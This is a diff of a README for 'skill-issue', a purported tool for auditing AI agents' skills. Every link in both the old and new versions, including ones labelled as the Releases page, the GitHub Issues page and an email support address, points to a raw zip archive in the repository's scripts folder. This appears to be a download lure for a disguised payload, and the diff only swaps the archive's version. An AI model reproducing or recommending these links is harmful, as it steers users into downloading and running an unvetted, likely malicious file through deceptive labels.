@@ -1,7 +1,7 @@
 # 🔍 skill-issue - Assess Your AI Skills Easily
 
 ## 📥 Download the Application
-[![Download skill-issue](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill_issue_v1.5.zip)](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill_issue_v1.5.zip)
+[![Download skill-issue](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill-issue-v1.2.zip)](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill-issue-v1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to skill-issue! This application helps you audit the skills of your AI agents. With our easy-to-use tool, you can analyze and improve their performance. Follow the steps below to download and run the software.
@@ -16,7 +16,7 @@ Before you download, ensure your system meets these requirements:
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill_issue_v1.5.zip) to access the latest version of skill-issue.
+1. Visit the [Releases page](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill-issue-v1.2.zip) to access the latest version of skill-issue.
 
 2. On the Releases page, look for the most recent version. You will find a list of available files for download.
 
@@ -70,7 +70,7 @@ Yes. skill-issue is a secure application. Always download from the official Rele
 ## 📞 Support
 If you run into any issues or have questions, you can reach out for support through the following channels:
 
-- **Issues Page:** Open an issue on the [GitHub Issues page](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill_issue_v1.5.zip).
-- **Email Support:** Contact our support team at https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill_issue_v1.5.zip
+- **Issues Page:** Open an issue on the [GitHub Issues page](https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill-issue-v1.2.zip).
+- **Email Support:** Contact our support team at https://github.com/Shubhgaji/skill-issue/raw/refs/heads/main/scripts/skill-issue-v1.2.zip
 
 Thank you for choosing skill-issue. We hope you find it helpful in managing your AI agents’ skills.
